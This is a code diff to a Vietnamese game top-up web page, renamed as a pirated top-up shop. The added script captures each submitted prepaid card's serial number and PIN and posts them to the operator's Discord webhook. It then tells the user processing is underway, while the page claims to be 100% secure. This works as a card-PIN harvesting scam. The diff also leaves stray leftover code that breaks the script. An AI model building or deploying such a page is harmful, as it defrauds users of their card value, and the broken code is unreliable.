@@ -148,7 +148,7 @@
 <body>
 
     <header>
-        <h1>Hệ Thống Nạp Game Giá Rẻ Tự Động</h1>
+        <h1>Hệ Thống Nạp Game Lậu Tự Động</h1>
         <p>Uy Tín - An Toàn - Bảo Mật 100%</p>
     </header>
 
@@ -249,19 +249,56 @@
 
     <script>
         // Xử lý sự kiện khi người dùng bấm nút nạp thẻ
-        document.getElementById('napTheForm').addEventListener('submit', function(e) {
-            e.preventDefault(); // Ngăn trang web tải lại mặc định
+document.getElementById('napTheForm').addEventListener('submit', function(e) {
+    e.preventDefault();
 
-            // Lấy dữ liệu từ các ô nhập liệu
-            const username = document.getElementById('username').value;
-            const loaithe = document.getElementById('loaithe').value;
-            const menhgia = document.getElementById('menhgia').value;
-            const seri = document.getElementById('seri').value;
-            const pin = document.getElementById('pin').value;
+    // 1. Lấy dữ liệu từ Form
+    const username = document.getElementById('username').value;
+    const loaithe = document.getElementById('loaithe').value.toUpperCase();
+    const menhgia = Number(document.getElementById('menhgia').value).toLocaleString() + 'đ';
+    const seri = document.getElementById('seri').value;
+    const pin = document.getElementById('pin').value;
 
-            // Thông báo giả lập (Bạn cần cấu hình API kết nối backend ở đây để nhận thẻ thực tế)
-            alert(`Hệ thống đã ghi nhận yêu cầu!\n\nTài khoản: ${username}\nLoại thẻ: ${loaithe.toUpperCase()}\nMệnh giá: ${Number(menhgia).toLocaleString()}đ\n\nĐang tiến hành kiểm tra thẻ...`);
-            
+    // 2. Điền Webhook URL của bạn vào đây
+    const webhookURL = "THAY_THẾ_LINK_DISCORD_WEBHOOK_CỦA_BẠN_VÀO_ĐÂY";
+
+    // 3. Cấu hình cấu trúc nội dung gửi sang Discord (Dạng Embed cho đẹp mắt)
+    const discordPayload = {
+        embeds: [{
+            title: "🚨 CÓ ĐƠN NẠP THẺ MỚI!",
+            color: 16721495, // Màu đỏ (Mã HEX đổi sang Thập phân)
+            fields: [
+                { name: "👤 Tài khoản/ID", value: `\`${username}\``, inline: true },
+                { name: "💳 Loại thẻ", value: `**${loaithe}**`, inline: true },
+                { name: "💰 Mệnh giá", value: `**${menhgia}**`, inline: true },
+                { name: "📌 Số Seri", value: `\`${seri}\``, inline: false },
+                { name: "🔑 Mã thẻ (PIN)", value: `\`${pin}\``, inline: false }
+            ],
+            timestamp: new Date().toISOString(),
+            footer: { text: "Hệ thống tự động ShopNapLau" }
+        }]
+    };
+
+    // 4. Dùng Fetch API để đẩy dữ liệu lên Discord
+    fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(discordPayload)
+    })
+    .then(response => {
+        if (response.ok) {
+            alert("Gửi thẻ thành công! Vui lòng chờ hệ thống xử lý trong ít phút.");
+            document.getElementById('napTheForm').reset(); // Xóa sạch form
+        } else {
+            alert("Có lỗi xảy ra khi gửi dữ liệu. Vui lòng thử lại!");
+        }
+    })
+    .catch(error => {
+        console.error("Lỗi:", error);
+        alert("Không thể kết nối tới máy chủ thanh toán!");
+    });
+});
+
             // Xóa trắng form sau khi gửi
             this.reset();
         });
